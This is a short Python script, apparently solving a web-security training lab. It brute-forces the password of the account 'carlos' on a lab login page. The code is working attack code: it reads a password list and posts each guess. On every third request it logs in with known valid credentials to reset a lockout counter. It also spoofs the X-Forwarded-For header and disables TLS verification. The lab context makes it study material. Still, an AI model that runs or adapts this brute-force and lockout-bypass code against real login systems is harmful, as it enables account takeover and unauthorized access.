#the point of this script is to allow you to brute the password for user carlos.  you already konw that the max login attempts before
#lockout is 2 based on the scenario.  so, create a password list where every third password is a junk password, and when the for loop
#gets to that password it will send a login request of a given correct credential wiener:peter to login to prevent a lockout from your
#ip address. we included ip spoofing in the script but it is unclear if it actually works, likely not.

#!/usr/bin/python3
import requests
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning
x = 0

def pass_crack():
	with open("passwords_known_creds","r") as f:
		global x
		for line in f:
			x = x+1
			if (x % 3) == 0:
				response = requests.post('https://0ab900ad04392696c062491100fc0059.web-security-academy.net/login', data = {'username' : 'wiener', 'password' : 'peter'}, headers = {'X-Forwarded-For': str(x)}, proxies=proxy, verify=False)
				#requests.get('https://0aa200de0375e4eac0f54d5d000b00ed.web-security-academy.net/logout', headers = {'X-Forwarded-For': str(x)}, proxies=proxy, verify=False) - dont actually need to logout of the correct user's account to make it work
				continue
			response2 = requests.post('https://0ab900ad04392696c062491100fc0059.web-security-academy.net/login', data = {'username' : 'carlos', 'password' : line.rstrip('\n')}, headers = {'X-Forwarded-For': str(x)}, proxies=proxy, verify=False)
			if 'Incorrect password' not in response2.text:
				print("Passsword is likely " + line)
				break

pass_crack()
